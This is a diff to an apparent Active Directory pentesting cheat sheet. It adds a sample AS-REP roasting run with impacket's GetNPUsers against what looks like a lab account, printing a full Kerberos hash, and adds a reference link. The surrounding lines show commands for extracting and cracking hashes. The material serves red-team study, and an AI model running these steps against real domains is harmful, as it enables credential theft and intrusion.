@@ -771,6 +771,13 @@ C:\Rubeus> john --wordlist=passwords_kerb.txt hashes.asreproast
 Using `impacket` to get the hash and `hashcat` to crack it.
 
 ```powershell
+# example
+$ python GetNPUsers.py htb.local/svc-alfresco -no-pass
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+
+[*] Getting TGT for svc-alfresco
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:c13528009a59be0a634bb9b8e84c88ee$cb8e87d02bd0ac7ae561334cd58a56af90f7fbb20bbd4493b6754a57d5ebc08cb7f47ea472ebb7c9ba4260f57c11b664be03191550254e5c77a17518aeabc55f9321bd9f52201df820e130aa0e3f4b0986725fd3a14794433881050eb62d384c4058a407a348a7de2ef0767a99c9df4f85d8eba8ce30a4ad59621c51f8ea8c0d33f33e06bea1d8ff28d7a86fc2010fd7fa45d2fcc2178cb13c1006823aec8a5da10cffcceeb6e978754b0d4976df5cccb4beb9776d5a8f4810153ccc0e1237ec74e6ae61402457c6cfe29bca7c2f62b287f13aff063f5a0a21c728581e43b46d7537b3e776b4
+
 # extract hashes
 root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
 root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
@@ -1564,3 +1571,4 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 6b3723410a3c5
 * [Escalating privileges with ACLs in Active Directory - April 26, 2018 - Rindert Kramer and Dirk-jan Mollema](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
 * [A Red Teamer’s Guide to GPOs and OUs - APRIL 2, 2018 - @_wald0](https://wald0.com/?p=179)
 * [Carlos Garcia - Rooted2019 - Pentesting Active Directory Forests public.pdf](https://www.dropbox.com/s/ilzjtlo0vbyu1u0/Carlos%20Garcia%20-%20Rooted2019%20-%20Pentesting%20Active%20Directory%20Forests%20public.pdf?dl=0)
+* [Kerberosity Killed the Domain: An Offensive Kerberos Overview - Ryan Hausknecht - Mar 10](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
